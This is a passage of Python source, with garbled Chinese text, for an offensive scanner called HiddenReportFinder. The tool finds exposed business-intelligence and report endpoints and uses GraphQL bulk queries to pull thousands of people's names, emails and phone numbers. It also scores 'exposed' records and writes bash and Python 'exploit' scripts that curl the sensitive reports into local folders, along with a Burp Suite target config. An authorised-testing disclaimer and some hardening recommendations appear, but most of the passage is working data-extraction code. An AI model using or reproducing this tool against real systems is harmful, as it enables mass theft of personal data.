                                    print(f"    å‘ç°æ•°æ®ç±»å‹: {', '.join(data_types)}")
                                    
                                    # æ„é€ æ‰¹é‡æŸ¥è¯¢
                                    await self.exploit_graphql_bulk(session, url, data_types)
                                    
                                self.found_reports.append({
                                    'endpoint': url,
                                    'type': 'graphql',
                                    'schema_types': len(types),
                                    'data_types': data_types
                                })
                                
                except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                
                    logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
    async def exploit_graphql_bulk(self, session, url, data_types):
        """åˆ©ç”¨GraphQLæ‰¹é‡æŸ¥è¯¢"""
        print("[+] å°è¯•GraphQLæ‰¹é‡æŸ¥è¯¢...")
        
        # æ„é€ æ‰¹é‡æŸ¥è¯¢
        for type_name in data_types[:3]:  # é™åˆ¶æ•°é‡ï¼Œé¿å…è¿‡åº¦æ‰«æ
            # çŒœæµ‹æŸ¥è¯¢åç§°
            query_names = [
                type_name.lower() + 's',  # patients
                'all' + type_name + 's',  # allPatients
                'get' + type_name + 's',  # getPatients
                type_name.lower() + 'List',  # patientList
            ]
            
            for query_name in query_names:
                bulk_query = {
                    "query": f"""
                    {{
                        {query_name}(first: 10000) {{
                            id
                            name
                            email
                            phone
                            createdAt
                        }}
                    }}
                    """
                }
                
                try:
                    async with session.post(
                        url,
                        json=bulk_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=30
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if 'data' in data and query_name in data['data']:
                                results = data['data'][query_name]
                                if results and len(results) > 0:
                                    print(f"[!] GraphQLæ‰¹é‡æŸ¥è¯¢æˆåŠŸ: {query_name}")
                                    print(f"    è·å– {len(results)} æ¡è®°å½•")
                                    
                                    self.extracted_data.append({
                                        'source': 'graphql',
                                        'query': query_name,
                                        'count': len(results),
                                        'sample': results[:5]
                                    })
                                    
                except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                    
                    logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
    def format_size(self, size):
        """æ ¼å¼åŒ–æ–‡ä»¶å¤§å°"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.2f} {unit}"
            size /= 1024.0
        return f"{size:.2f} TB"

    def generate_smart_report(self):
        """ç”Ÿæˆæ™ºèƒ½åŒ–æŠ¥å‘Š - åŒ…å«ä»·å€¼è¯„ä¼°å’ŒPOC"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # ç»¼åˆåˆ†æå’Œä»·å€¼è¯„ä¼°
        analysis = self._analyze_scan_results()
        
        # ç”Ÿæˆè¯¦ç»†æŠ¥å‘Š
        report = {
            'meta': {
                'target': self.target_url,
                'scan_time': datetime.now().isoformat(),
                'scanner_version': 'HiddenReportFinder v2.0 (Enhanced)',
                'scan_id': f"HRF_{timestamp}",
                'noise_filter_enabled': NOISE_FILTER_AVAILABLE
            },
            
            # æŠ€æœ¯æ ˆä¿¡æ¯
            'technology_stack': self.detected_tech_stack,
            
            # BIç³»ç»Ÿå‘ç°
            'bi_systems': {
                'total_found': len(self.bi_systems),
                'systems': self.bi_systems,
                'high_confidence': [bi for bi in self.bi_systems if bi.get('confidence', 0) > 70],
                'with_default_creds': [bi for bi in self.bi_systems if bi.get('default_creds_found', False)]
            },
            
            # æŠ¥è¡¨ç«¯ç‚¹å‘ç°
            'report_endpoints': {
                'total_found': len(self.export_endpoints),
                'high_value': [ep for ep in self.export_endpoints if ep.get('value_score', 0) > 70],
                'accessible': [ep for ep in self.export_endpoints if ep.get('status') == 200],
                'auth_required': [ep for ep in self.export_endpoints if ep.get('status') in [401, 403]],
                'by_discovery_method': self._group_by_discovery_method()
            },
            
            # æˆåŠŸçš„æŠ¥è¡¨è·å–
            'successful_reports': {
                'total_found': len(self.found_reports),
                'by_sensitive_level': self._group_by_sensitive_level(),
                'high_value_reports': [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 80],
                'with_sensitive_data': [r for r in self.found_reports if r.get('analysis', {}).get('has_sensitive_data', False)]
            },
            
            # æ•°æ®æ³„éœ²åˆ†æ
            'data_exposure_analysis': analysis['data_exposure'],
            
            # å®‰å…¨é£é™©è¯„ä¼°
            'security_assessment': analysis['security_risks'],
            
            # å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡
            'noise_filtering_stats': self.noise_stats,
            
            # WAFé˜²æŠ¤ç»Ÿè®¡
            'waf_protection_stats': {
                'waf_defender_enabled': WAF_DEFENDER_AVAILABLE,
                'waf_defender_initialized': self.waf_defender_initialized,
                'target_url': self.target_url,
                'protection_status': 'å·²å¯ç”¨WAFæ¬ºéª—æ£€æµ‹' if self.waf_defender_initialized else 
                                   ('WAF Defenderä¸å¯ç”¨' if not WAF_DEFENDER_AVAILABLE else 'æœªåˆå§‹åŒ–'),
                'baseline_info': self.waf_defender.get_stats() if self.waf_defender else None
            },
            
            # æ”»å‡»é¢è¯„ä¼°
            'attack_surface': analysis['attack_surface'],
            
            # å»ºè®®å’Œä¸‹ä¸€æ­¥
            'recommendations': analysis['recommendations']
        }
        
        # ä¿å­˜JSONæŠ¥å‘Š
        report_file = f"hidden_report_finder_smart_{timestamp}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2, default=str)
        
        # ç”Ÿæˆåˆ©ç”¨è„šæœ¬
        self._generate_exploitation_scripts(timestamp, analysis)
        
        # ç”ŸæˆHTMLæŠ¥å‘Š
        self._generate_html_report(timestamp, report, analysis)
        
        # ç”ŸæˆBurp Suiteé…ç½®
        self._generate_burp_config(timestamp)
        
        # æ‰“å°æ‘˜è¦
        self._print_smart_summary(report, analysis)
        
        print(f"\n æ™ºèƒ½åŒ–æŠ¥å‘Šç”Ÿæˆå®Œæˆ!")
        print(f"ğŸ“„ è¯¦ç»†æŠ¥å‘Š: {report_file}")
        
        return report

    def _analyze_scan_results(self):
        """åˆ†ææ‰«æç»“æœ"""
        analysis = {
            'data_exposure': {
                'severity': 'low',
                'total_records_exposed': 0,
                'sensitive_data_types': [],
                'exposure_methods': []
            },
            'security_risks': {
                'overall_risk': 'low',
                'critical_issues': [],
                'high_issues': [],
                'medium_issues': []
            },
            'attack_surface': {
                'entry_points': len(self.export_endpoints),
                'bi_systems': len(self.bi_systems),
                'bypass_successful': len([r for r in self.found_reports if r.get('bypass_type')]),
                'hidden_paths': len([ep for ep in self.export_endpoints if ep.get('discovered_method') == 'hidden_path_discovery'])
            },
            'recommendations': []
        }
        
        # æ•°æ®æš´éœ²åˆ†æ
        total_records = 0
        sensitive_types = set()
        
        for report in self.found_reports:
            if 'analysis' in report:
                record_count = report['analysis'].get('record_count', 0)
                if isinstance(record_count, int):
                    total_records += record_count
                
                if report['analysis'].get('has_sensitive_data'):
                    sensitive_fields = report['analysis'].get('sensitive_fields', [])
                    sensitive_types.update(sensitive_fields)
        
        analysis['data_exposure']['total_records_exposed'] = total_records
        analysis['data_exposure']['sensitive_data_types'] = list(sensitive_types)
        
        # ä¸¥é‡ç¨‹åº¦è¯„ä¼°
        if total_records > 10000 or len(sensitive_types) > 5:
            analysis['data_exposure']['severity'] = 'critical'
        elif total_records > 1000 or len(sensitive_types) > 2:
            analysis['data_exposure']['severity'] = 'high'
        elif total_records > 100 or len(sensitive_types) > 0:
            analysis['data_exposure']['severity'] = 'medium'
        
        # å®‰å…¨é£é™©è¯„ä¼°
        critical_issues = []
        high_issues = []
        medium_issues = []
        
        # æ£€æŸ¥å…³é”®é—®é¢˜
        if any(r.get('analysis', {}).get('sensitive_level') == 'high' for r in self.found_reports):
            critical_issues.append("å‘ç°é«˜æ•æ„Ÿåº¦æ•°æ®æš´éœ²")
        
        if len([bi for bi in self.bi_systems if bi.get('default_creds_found', False)]) > 0:
            critical_issues.append("BIç³»ç»Ÿå­˜åœ¨é»˜è®¤å‡­æ®")
        
        # æ£€æŸ¥é«˜é£é™©é—®é¢˜
        if len([ep for ep in self.export_endpoints if ep.get('status') == 200]) > 5:
            high_issues.append("å¤§é‡æŠ¥è¡¨ç«¯ç‚¹å¯ç›´æ¥è®¿é—®")
        
        if len([r for r in self.found_reports if r.get('bypass_type')]) > 0:
            high_issues.append("å­˜åœ¨æƒé™ç»•è¿‡æ¼æ´")
        
        # æ£€æŸ¥ä¸­ç­‰é£é™©é—®é¢˜
        if len(self.bi_systems) > 0:
            medium_issues.append("æ£€æµ‹åˆ°BIç³»ç»Ÿï¼Œéœ€è¿›ä¸€æ­¥è¯„ä¼°")
        
        if len([ep for ep in self.export_endpoints if ep.get('status') in [401, 403]]) > 3:
            medium_issues.append("å¤šä¸ªç«¯ç‚¹éœ€è¦è®¤è¯ï¼Œå¯èƒ½å­˜åœ¨ç»•è¿‡æœºä¼š")
        
        analysis['security_risks']['critical_issues'] = critical_issues
        analysis['security_risks']['high_issues'] = high_issues  
        analysis['security_risks']['medium_issues'] = medium_issues
        
        # æ€»ä½“é£é™©è¯„ä¼°
        if critical_issues:
            analysis['security_risks']['overall_risk'] = 'critical'
        elif high_issues:
            analysis['security_risks']['overall_risk'] = 'high'
        elif medium_issues:
            analysis['security_risks']['overall_risk'] = 'medium'
        
        # ç”Ÿæˆå»ºè®®
        recommendations = []
        
        if analysis['data_exposure']['severity'] in ['critical', 'high']:
            recommendations.append("ğŸš¨ ç«‹å³é™åˆ¶æŠ¥è¡¨ç«¯ç‚¹è®¿é—®æƒé™")
            recommendations.append(" å®æ–½å¼ºèº«ä»½è®¤è¯å’Œæˆæƒæœºåˆ¶")
        
        if len(self.bi_systems) > 0:
            recommendations.append(" å®¡æŸ¥BIç³»ç»Ÿé…ç½®å’Œæƒé™è®¾ç½®")
            recommendations.append(" æ›´æ”¹æ‰€æœ‰é»˜è®¤å‡­æ®")
        
        if len([r for r in self.found_reports if r.get('bypass_type')]) > 0:
            recommendations.append(" ä¿®å¤æƒé™ç»•è¿‡æ¼æ´")
            recommendations.append(" è¿›è¡Œå®‰å…¨ä»£ç å®¡è®¡")
        
        recommendations.extend([
            " å®šæœŸè¿›è¡ŒæŠ¥è¡¨ç³»ç»Ÿå®‰å…¨æ‰«æ",
            " å®æ–½æ•°æ®æ³„æ¼é˜²æŠ¤(DLP)è§£å†³æ–¹æ¡ˆ",
            " å»ºç«‹æ•°æ®è®¿é—®æ—¥å¿—å’Œç›‘æ§"
        ])
        
        analysis['recommendations'] = recommendations
        
        return analysis

    def _group_by_discovery_method(self):
        """æŒ‰å‘ç°æ–¹æ³•åˆ†ç»„"""
        groups = {}
        for ep in self.export_endpoints:
            method = ep.get('discovered_method', 'unknown')
            if method not in groups:
                groups[method] = []
            groups[method].append(ep)
        return groups

    def _group_by_sensitive_level(self):
        """æŒ‰æ•æ„Ÿåº¦çº§åˆ«åˆ†ç»„"""
        groups = {'critical': [], 'high': [], 'medium': [], 'low': []}
        for report in self.found_reports:
            level = report.get('sensitive_level', 'low')
            if level in groups:
                groups[level].append(report)
        return groups

    def _generate_exploitation_scripts(self, timestamp, analysis):
        """ç”Ÿæˆåˆ©ç”¨è„šæœ¬"""
        if not self.found_reports:
            return
            
        # Bashä¸‹è½½è„šæœ¬
        script_file = f"exploit_reports_{timestamp}.sh"
        with open(script_file, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# æ™ºèƒ½åŒ–æŠ¥è¡¨åˆ©ç”¨è„šæœ¬\n")
            f.write(f"# ç›®æ ‡: {self.target_url}\n")
            f.write(f"# ç”Ÿæˆæ—¶é—´: {datetime.now()}\n")
            f.write(f"# é£é™©ç­‰çº§: {analysis['security_risks']['overall_risk']}\n\n")
            
            f.write("# åˆ›å»ºç›®å½•ç»“æ„\n")
            f.write("mkdir -p exploit_results/{sensitive_data,bi_systems,bypass_techniques}\n\n")
            
            # åˆ†ç±»ä¸‹è½½
            for i, report in enumerate(self.found_reports):
                url = report.get('url', report.get('endpoint', ''))
                method = report.get('method', 'GET')
                headers = report.get('headers', {})
                
                # ç¡®å®šæ–‡ä»¶ç±»å‹å’Œç›®å½•
                content_type = report.get('content_type', '')
                sensitive_level = report.get('sensitive_level', 'low')
                
                if sensitive_level in ['critical', 'high']:
                    directory = "exploit_results/sensitive_data"
                elif report.get('bypass_type'):
                    directory = "exploit_results/bypass_techniques"
                else:
                    directory = "exploit_results/bi_systems"
                
                # ç¡®å®šæ–‡ä»¶æ‰©å±•å
                if 'json' in content_type:
                    ext = '.json'
                elif 'csv' in content_type:
                    ext = '.csv'
                elif 'excel' in content_type:
                    ext = '.xlsx'
                elif 'xml' in content_type:
                    ext = '.xml'
                else:
                    ext = '.data'
                
                f.write(f"# æŠ¥è¡¨ {i+1} - {sensitive_level} æ•æ„Ÿåº¦\n")
                f.write(f"echo 'ä¸‹è½½æŠ¥è¡¨ {i+1}: {url[:50]}...'\n")
                
                # æ„é€ curlå‘½ä»¤
                curl_cmd = f"curl -X {method}"
                if headers:
                    for key, value in headers.items():
                        curl_cmd += f" -H '{key}: {value}'"
                
                curl_cmd += f" -o '{directory}/report_{i+1}_{sensitive_level}{ext}' '{url}'"
                f.write(f"{curl_cmd}\n\n")
            
            f.write("echo ' æ‰€æœ‰æŠ¥è¡¨ä¸‹è½½å®Œæˆ!'\n")
            f.write("echo ' ç»Ÿè®¡ä¿¡æ¯:'\n")
            f.write("find exploit_results/ -type f -exec ls -lh {} + | awk '{print $5, $9}'\n")
        
        import os
        os.chmod(script_file, 0o755)
        
        # Pythonè‡ªåŠ¨åŒ–è„šæœ¬
        py_script_file = f"exploit_automation_{timestamp}.py"
        with open(py_script_file, 'w') as f:
            f.write(f"""#!/usr/bin/env python3
# æ™ºèƒ½åŒ–æŠ¥è¡¨è‡ªåŠ¨åˆ©ç”¨è„šæœ¬
# ç”Ÿæˆæ—¶é—´: {datetime.now()}

import asyncio
import aiohttp
import json
import os
from datetime import datetime

class ReportExploiter:
    def __init__(self):
        self.target_url = "{self.target_url}"
        self.results = []
        
    async def exploit_all_reports(self):
        print(" å¼€å§‹è‡ªåŠ¨åŒ–æŠ¥è¡¨åˆ©ç”¨...")
        
        # é«˜ä»·å€¼æŠ¥è¡¨åˆ—è¡¨
        high_value_reports = {json.dumps([r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 70], indent=2)}
        
        async with aiohttp.ClientSession() as session:
            for report in high_value_reports:
                await self._exploit_single_report(session, report)
        
        await self._generate_analysis_report()
    
    async def _exploit_single_report(self, session, report):
        url = report.get('url', '')
        method = report.get('method', 'GET')
        headers = report.get('headers', {{}})
        
        try:
            async with session.request(method, url, headers=headers) as resp:
                if resp.status == 200:
                    content = await resp.read()
                    await self._analyze_and_save(report, content)
                    print(f" æˆåŠŸåˆ©ç”¨: {{url[:50]}}...")
        except Exception as e:
            print(f" åˆ©ç”¨å¤±è´¥: {{e}}")
    
    async def _analyze_and_save(self, report, content):
        # è¿™é‡Œå¯ä»¥æ·»åŠ æ›´å¤šçš„æ•°æ®åˆ†æé€»è¾‘
        analysis = report.get('analysis', {{}})
        
        # ä¿å­˜æ•°æ®
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"exploited_data_{{timestamp}}.json"
        
        with open(filename, 'w') as f:
            json.dump({{
                'report_info': report,
                'data_size': len(content),
                'timestamp': timestamp
            }}, f, indent=2)
    
    async def _generate_analysis_report(self):
        print(" ç”Ÿæˆåˆ†ææŠ¥å‘Š...")
        # åˆ†æé€»è¾‘...

if __name__ == "__main__":
    exploiter = ReportExploiter()
    asyncio.run(exploiter.exploit_all_reports())
""")
        
        os.chmod(py_script_file, 0o755)
        
        print(f" åˆ©ç”¨è„šæœ¬: {script_file}")
        print(f" è‡ªåŠ¨åŒ–è„šæœ¬: {py_script_file}")

    def _generate_html_report(self, timestamp, report, analysis):
        """ç”ŸæˆHTMLå¯è§†åŒ–æŠ¥å‘Š"""
        html_file = f"smart_report_{timestamp}.html"
        
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ™ºèƒ½åŒ–éšè—æŠ¥è¡¨å‘ç°æŠ¥å‘Š</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .header .meta {{ opacity: 0.9; margin-top: 10px; }}
        .content {{ padding: 30px; }}
        .section {{ margin-bottom: 40px; }}
        .section h2 {{ color: #333; border-bottom: 3px solid #667eea; padding-bottom: 10px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0; }}
        .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #667eea; }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #667eea; }}
        .risk-critical {{ border-left-color: #dc3545; color: #dc3545; }}
        .risk-high {{ border-left-color: #fd7e14; color: #fd7e14; }}
        .risk-medium {{ border-left-color: #ffc107; color: #ffc107; }}
        .risk-low {{ border-left-color: #28a745; color: #28a745; }}
        .table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        .table th, .table td {{ border: 1px solid #dee2e6; padding: 12px; text-align: left; }}
        .table th {{ background: #f8f9fa; font-weight: 600; }}
        .badge {{ padding: 4px 8px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }}
        .badge-critical {{ background: #dc3545; color: white; }}
        .badge-high {{ background: #fd7e14; color: white; }}
        .badge-medium {{ background: #ffc107; color: black; }}
        .badge-low {{ background: #28a745; color: white; }}
        .recommendations {{ background: #e7f3ff; padding: 20px; border-radius: 8px; border: 1px solid #b3d9ff; }}
        .recommendations ul {{ margin: 0; padding-left: 20px; }}
        .recommendations li {{ margin: 10px 0; }}
        .code-block {{ background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; overflow-x: auto; }}
        .footer {{ text-align: center; padding: 20px; color: #666; border-top: 1px solid #dee2e6; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1> æ™ºèƒ½åŒ–éšè—æŠ¥è¡¨å‘ç°æŠ¥å‘Š</h1>
            <div class="meta">
                <p>ç›®æ ‡: {self.target_url}</p>
                <p>æ‰«ææ—¶é—´: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>æ‰«æå™¨ç‰ˆæœ¬: HiddenReportFinder v2.0 (Enhanced)</p>
                <p>å™ªéŸ³è¿‡æ»¤: {' å¯ç”¨' if NOISE_FILTER_AVAILABLE else ' ç¦ç”¨'}</p>
            </div>
        </div>
        
        <div class="content">
            <!-- æ¦‚è§ˆç»Ÿè®¡ -->
            <div class="section">
                <h2> æ‰«ææ¦‚è§ˆ</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{len(self.found_reports)}</div>
                        <div>æˆåŠŸè·å–çš„æŠ¥è¡¨</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(self.export_endpoints)}</div>
                        <div>å‘ç°çš„æŠ¥è¡¨ç«¯ç‚¹</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(self.bi_systems)}</div>
                        <div>æ£€æµ‹åˆ°çš„BIç³»ç»Ÿ</div>
                    </div>
                    <div class="stat-card risk-{analysis['security_risks']['overall_risk']}">
                        <div class="stat-number">{analysis['security_risks']['overall_risk'].upper()}</div>
                        <div>æ•´ä½“é£é™©ç­‰çº§</div>
                    </div>
                </div>
            </div>
            
            <!-- æ•°æ®æš´éœ²åˆ†æ -->
            <div class="section">
                <h2>ğŸš¨ æ•°æ®æš´éœ²åˆ†æ</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{analysis['data_exposure']['total_records_exposed']:,}</div>
                        <div>æš´éœ²çš„æ•°æ®è®°å½•æ•°</div>
                    </div>
                    <div class="stat-card risk-{analysis['data_exposure']['severity']}">
                        <div class="stat-number">{analysis['data_exposure']['severity'].upper()}</div>
                        <div>æ•°æ®æš´éœ²ä¸¥é‡ç¨‹åº¦</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(analysis['data_exposure']['sensitive_data_types'])}</div>
                        <div>æ•æ„Ÿæ•°æ®ç±»å‹</div>
                    </div>
                </div>
                
                <h3>æ•æ„Ÿæ•°æ®ç±»å‹è¯¦æƒ…:</h3>
                <div class="code-block">
                    {', '.join(analysis['data_exposure']['sensitive_data_types']) or 'æ— æ•æ„Ÿæ•°æ®æ£€æµ‹'}
                </div>
            </div>
            
            <!-- BIç³»ç»Ÿå‘ç° -->
            <div class="section">
                <h2> BIç³»ç»Ÿå‘ç°</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>ç³»ç»Ÿåç§°</th>
                            <th>URL</th>
                            <th>çŠ¶æ€</th>
                            <th>ç½®ä¿¡åº¦</th>
                            <th>ç‰ˆæœ¬</th>
                            <th>éœ€è¦è®¤è¯</th>
                        </tr>
                    </thead>
                    <tbody>""")
            
            for bi in self.bi_systems:
                confidence_class = 'high' if bi.get('confidence', 0) > 70 else 'medium' if bi.get('confidence', 0) > 40 else 'low'
                f.write(f"""
                        <tr>
                            <td>{bi.get('name', 'Unknown')}</td>
                            <td><a href="{bi.get('url', '')}" target="_blank">{bi.get('url', '')[:50]}...</a></td>
                            <td><span class="badge badge-{confidence_class}">{bi.get('status', 'Unknown')}</span></td>
                            <td>{bi.get('confidence', 0)}%</td>
                            <td>{bi.get('version', 'Unknown')}</td>
                            <td>{'æ˜¯' if bi.get('auth_required', False) else 'å¦'}</td>
                        </tr>""")
            
            f.write(f"""
                    </tbody>
                </table>
            </div>
            
            <!-- é«˜ä»·å€¼æŠ¥è¡¨ -->
            <div class="section">
                <h2> é«˜ä»·å€¼æŠ¥è¡¨å‘ç°</h2>
                <table class="table">
                    <thead>
                        <tr>
                            <th>æŠ¥è¡¨URL</th>
                            <th>æ•æ„Ÿåº¦</th>
                            <th>æ•°æ®å¤§å°</th>
                            <th>è®°å½•æ•°</th>
                            <th>å‘ç°æ–¹æ³•</th>
                            <th>æ“ä½œ</th>
                        </tr>
                    </thead>
                    <tbody>""")
            
            high_value_reports = [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 70]
            for report in high_value_reports[:10]:  # åªæ˜¾ç¤ºå‰10ä¸ª
                sensitive_level = report.get('sensitive_level', 'low')
                size = self.format_size(report.get('size', 0))
                record_count = report.get('analysis', {}).get('record_count', 'Unknown')
                discovery_method = report.get('discovery_method', 'Unknown')
                url = report.get('url', report.get('endpoint', ''))
                
                f.write(f"""
                        <tr>
                            <td><a href="{url}" target="_blank">{url[:60]}...</a></td>
                            <td><span class="badge badge-{sensitive_level}">{sensitive_level.upper()}</span></td>
                            <td>{size}</td>
                            <td>{record_count}</td>
                            <td>{discovery_method}</td>
                            <td><button onclick="window.open('{url}')">è®¿é—®</button></td>
                        </tr>""")
            
            f.write(f"""
                    </tbody>
                </table>
            </div>
            
            <!-- å®‰å…¨å»ºè®® -->
            <div class="section">
                <h2> å®‰å…¨å»ºè®®</h2>
                <div class="recommendations">
                    <h3>ç«‹å³è¡ŒåŠ¨å»ºè®®:</h3>
                    <ul>""")
            
            for recommendation in analysis['recommendations']:
                f.write(f"<li>{recommendation}</li>")
            
            f.write(f"""
                    </ul>
                </div>
            </div>
            
            <!-- å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡ -->
            <div class="section">
                <h2> å™ªéŸ³è¿‡æ»¤æ•ˆæœ</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['total_paths_tested']}</div>
                        <div>æ€»æµ‹è¯•è·¯å¾„æ•°</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['noise_filtered']}</div>
                        <div>è¿‡æ»¤çš„å™ªéŸ³æ•°</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{self.noise_stats['valuable_findings']}</div>
                        <div>æœ‰ä»·å€¼å‘ç°æ•°</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{(self.noise_stats['noise_filtered'] / max(1, self.noise_stats['total_paths_tested']) * 100):.1f}%</div>
                        <div>å™ªéŸ³è¿‡æ»¤ç‡</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>Generated by HiddenReportFinder v2.0 (Enhanced) - æ™ºèƒ½åŒ–BIä¸æŠ¥è¡¨ç³»ç»Ÿå®‰å…¨æ‰«æå™¨</p>
            <p> æœ¬æŠ¥å‘Šä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•ç›®çš„</p>
        </div>
    </div>
    
    <script>
        // æ·»åŠ ä¸€äº›äº¤äº’åŠŸèƒ½
        document.addEventListener('DOMContentLoaded', function() {{
            console.log(' Hidden Report Finder - Smart Report Loaded');
        }});
    </script>
</body>
</html>""")
        
        print(f" HTMLæŠ¥å‘Š: {html_file}")

    def _generate_burp_config(self, timestamp):
        """ç”ŸæˆBurp Suiteé…ç½®æ–‡ä»¶"""
        if not self.found_reports:
            return
            
        config_file = f"burp_config_{timestamp}.json"
        
        # æ„é€ Burpé…ç½®
        burp_config = {
            "target": {
                "scope": {
                    "advanced_mode": True,
                    "exclude": [],
                    "include": [{
                        "enabled": True,
                        "file": ".*",
                        "host": urlparse(self.target_url).netloc,
                        "port": "443" if self.target_url.startswith('https') else "80",
                        "protocol": "https" if self.target_url.startswith('https') else "http"
                    }]
                }
            },
            "scanner": {
                "live_scanning": {
                    "url_scope": "target_scope"
                }
            },
            "intruder": {
                "payloads": []
            }
        }
        
        # æ·»åŠ å‘ç°çš„ç«¯ç‚¹ä½œä¸ºintruderç›®æ ‡
        payloads = []
        for report in self.found_reports:
            url = report.get('url', report.get('endpoint', ''))
            if url:
                payloads.append({
                    "url": url,
                    "method": report.get('method', 'GET'),
                    "sensitive_level": report.get('sensitive_level', 'low'),
                    "value_score": report.get('analysis', {}).get('data_value_score', 0)
                })
        
        burp_config['discovered_endpoints'] = payloads
        
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(burp_config, f, indent=2, ensure_ascii=False)
            
        print(f" Burpé…ç½®: {config_file}")

    def _print_smart_summary(self, report, analysis):
        """æ‰“å°æ™ºèƒ½æ‘˜è¦"""
        print(f"\n" + "="*80)
        print(f" æ™ºèƒ½åŒ–éšè—æŠ¥è¡¨å‘ç°å®Œæˆ!")
        print(f"="*80)
        
        # åŸºç¡€ç»Ÿè®¡
        print(f" æ‰«æç»Ÿè®¡:")
        print(f"   â€¢ ç›®æ ‡ç³»ç»Ÿ: {self.target_url}")
        print(f"   â€¢ BIç³»ç»Ÿ: {len(self.bi_systems)} ä¸ª")
        print(f"   â€¢ æŠ¥è¡¨ç«¯ç‚¹: {len(self.export_endpoints)} ä¸ª")
        print(f"   â€¢ æˆåŠŸè·å–: {len(self.found_reports)} ä¸ªæŠ¥è¡¨")
        print(f"   â€¢ æµ‹è¯•è·¯å¾„: {self.noise_stats['total_paths_tested']} ä¸ª")
        
        # å™ªéŸ³è¿‡æ»¤æ•ˆæœ
        if NOISE_FILTER_AVAILABLE:
            noise_ratio = self.noise_stats['noise_filtered'] / max(1, self.noise_stats['total_paths_tested'])
            print(f"\n å™ªéŸ³è¿‡æ»¤æ•ˆæœ:")
            print(f"   â€¢ è¿‡æ»¤å™ªéŸ³: {self.noise_stats['noise_filtered']} ä¸ª")
            print(f"   â€¢ æœ‰ä»·å€¼å‘ç°: {self.noise_stats['valuable_findings']} ä¸ª") 
            print(f"   â€¢ è¿‡æ»¤ç‡: {noise_ratio:.1%}")
            if noise_ratio > 0.5:
                print(f"    æˆåŠŸé¿å…äº†ä¸¥é‡çš„'å‚»é€¼å…´å¥‹' - å¤§é‡å™ªéŸ³è¢«è¿‡æ»¤!")
        
        # é£é™©è¯„ä¼°
        print(f"\nğŸš¨ é£é™©è¯„ä¼°:")
        print(f"   â€¢ æ•´ä½“é£é™©: {analysis['security_risks']['overall_risk'].upper()}")
        print(f"   â€¢ æ•°æ®æš´éœ²: {analysis['data_exposure']['severity'].upper()}")
        print(f"   â€¢ æš´éœ²è®°å½•: {analysis['data_exposure']['total_records_exposed']:,} æ¡")
        print(f"   â€¢ æ•æ„Ÿç±»å‹: {len(analysis['data_exposure']['sensitive_data_types'])} ç§")
        
        # é«˜ä»·å€¼å‘ç°
        high_value = [r for r in self.found_reports if r.get('analysis', {}).get('data_value_score', 0) > 80]
        if high_value:
            print(f"\n é«˜ä»·å€¼å‘ç°:")
            for i, report in enumerate(high_value[:5], 1):
                url = report.get('url', report.get('endpoint', ''))[:50]
                score = report.get('analysis', {}).get('data_value_score', 0)
                level = report.get('sensitive_level', 'unknown')
                print(f"   {i}. {url}... (è¯„åˆ†: {score}, çº§åˆ«: {level})")
        
        # å…³é”®é—®é¢˜
        if analysis['security_risks']['critical_issues']:
            print(f"\nğŸš¨ å…³é”®é—®é¢˜:")
            for issue in analysis['security_risks']['critical_issues']:
                print(f"   â€¢ {issue}")
        
        # æ¨èè¡ŒåŠ¨
        print(f"\nï¸ æ¨èè¡ŒåŠ¨:")
        for i, rec in enumerate(analysis['recommendations'][:5], 1):
            print(f"   {i}. {rec}")
        
        print(f"\n" + "="*80)

    def generate_report(self):
